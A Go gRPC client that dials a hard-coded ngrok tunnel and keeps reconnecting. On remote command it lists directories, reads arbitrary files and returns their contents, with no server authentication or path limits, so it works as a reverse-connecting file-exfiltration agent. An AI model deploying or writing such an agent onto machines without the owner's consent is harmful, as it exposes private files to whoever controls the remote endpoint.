package main

import (
	"context"
	"fmt"
	"log"
	"os"
	"os/signal"
	"strings"
	"time"

	"github.com/cardfaux/windows-connect/grpcapi"
	"google.golang.org/grpc"
	"google.golang.org/grpc/keepalive"
)

func handleCommand(req *grpcapi.CommandRequest) *grpcapi.CommandResponse {
	switch req.Command {
	case grpcapi.CommandType_LIST_FILES:
		entries, err := os.ReadDir(req.Argument)
		if err != nil {
			return &grpcapi.CommandResponse{Success: false, Error: err.Error()}
		}
		var files []string
		for _, e := range entries {
			name := e.Name()
			if e.IsDir() {
				name += "/"
			}
			files = append(files, name)
		}
		return &grpcapi.CommandResponse{Output: strings.Join(files, "\n"), Success: true}

	case grpcapi.CommandType_GET_FILE:
		data, err := os.ReadFile(req.Argument)
		if err != nil {
			return &grpcapi.CommandResponse{Success: false, Error: err.Error()}
		}
		return &grpcapi.CommandResponse{Output: string(data), Success: true}

	case grpcapi.CommandType_GET_INFO:
		fi, err := os.Stat(req.Argument)
		if err != nil {
			return &grpcapi.CommandResponse{Success: false, Error: err.Error()}
		}
		info := fmt.Sprintf("Name: %s\nSize: %d bytes\nModified: %s\n", fi.Name(), fi.Size(), fi.ModTime())
		return &grpcapi.CommandResponse{Output: info, Success: true}

	default:
		return &grpcapi.CommandResponse{Success: false, Error: "Unknown command"}
	}
}

func main() {
	serverAddr := "2.tcp.ngrok.io:17244"

	// Handle Ctrl+C clean exit
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt)

	go func() {
		<-sig
		log.Println("Received interrupt. Exiting.")
		os.Exit(0)
	}()

	for {
		conn, err := grpc.Dial(
			serverAddr,
			grpc.WithInsecure(),
			grpc.WithKeepaliveParams(keepalive.ClientParameters{
				Time:                30 * time.Second,
				Timeout:             10 * time.Second,
				PermitWithoutStream: true,
			}),
		)
		if err != nil {
			log.Printf("Failed to connect: %v. Retrying in 5s...", err)
			time.Sleep(5 * time.Second)
			continue
		}

		client := grpcapi.NewEchoServiceClient(conn)
		stream, err := client.ExecuteCommand(context.Background())
		if err != nil {
			log.Printf("Stream error: %v. Retrying in 5s...", err)
			conn.Close()
			time.Sleep(5 * time.Second)
			continue
		}

		log.Println("Connected to server. Waiting for commands...")

		for {
			msg, err := stream.Recv()
			if err != nil {
				log.Printf("Stream closed: %v. Reconnecting...", err)
				conn.Close()
				break // reconnect
			}
			if req := msg.GetCommandRequest(); req != nil {
				resp := handleCommand(req)
				err = stream.Send(&grpcapi.CommandMessage{
					Message: &grpcapi.CommandMessage_CommandResponse{CommandResponse: resp},
				})
				if err != nil {
					log.Printf("Send error: %v. Reconnecting...", err)
					conn.Close()
					break // reconnect
				}
			}
		}
	}
}
